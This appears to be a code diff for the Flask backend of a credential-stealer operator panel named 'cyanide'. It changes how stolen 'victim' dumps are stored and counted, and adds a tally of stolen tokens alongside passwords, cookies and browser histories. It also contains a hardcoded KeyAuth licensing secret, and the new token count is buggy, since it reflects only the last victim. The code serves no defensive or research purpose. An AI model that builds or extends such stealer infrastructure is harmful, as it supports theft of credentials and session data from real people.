@@ -18,6 +18,7 @@ Defaultsettings = {
 }
 
 dbfile = os.path.join(os.path.dirname(__file__), "db.json")
+dumpfile = os.path.join(os.path.dirname(__file__), "dumps.json")
 
 keyAuth = keyauth.Keyauth("cyanide", "1ELEEIPBpf")
 keyAuth.init()
@@ -110,7 +111,7 @@ def tokenLogin():
     if not r["success"]:
         return jsonify({'error': r["message"], "success": False}), 401
     else:
-        return {"success": True}
+        return {"success": True, "username": username}
 
 
 @app.route('/signup', methods=['POST'])
@@ -148,16 +149,17 @@ def count():
     token = data["token"]
     rstring = data["n"]
 
-    db = json.load(open(dbfile, "r"))
+    dumps = json.load(open(dumpfile, "r"))
     tokenData = decodeJwt(token, rstring)
     username = tokenData["username"]
 
-    victims = db[username]["dumps"]
+    victims = dumps[username]["dumps"]
 
     count, password, cookies, histories = 0, 0, 0, 0
 
     if not len(victims) <= 0:
         for victim in victims:
+            tokens = victims[victim]["tokens"]
             for browser in victims[victim]["data"]:
                 for datatype in victims[victim]["data"][browser]:
                     if datatype.lower() == "history":
@@ -173,8 +175,7 @@ def count():
 
                     for cred in victims[victim]["data"][browser][datatype]:
                         count += 1
-
-    return {"creds": count, "victims": len(victims), "summary": {"passwords": password, "cookies": cookies, "histories": histories}}
+    return {"creds": count, "victims": len(victims), "tokens": len(tokens), "summary": {"passwords": password, "cookies": cookies, "histories": histories}}
 
 @app.route("/date", methods=["POST"])
 def getDate():
@@ -184,7 +185,7 @@ def getDate():
     token = data["token"]
     rstring = data["n"]
 
-    db = json.load(open(dbfile, "r"))
+    db = json.load(open(dumpfile, "r"))
     tokenData = decodeJwt(token, rstring)
     username = tokenData["username"]
 
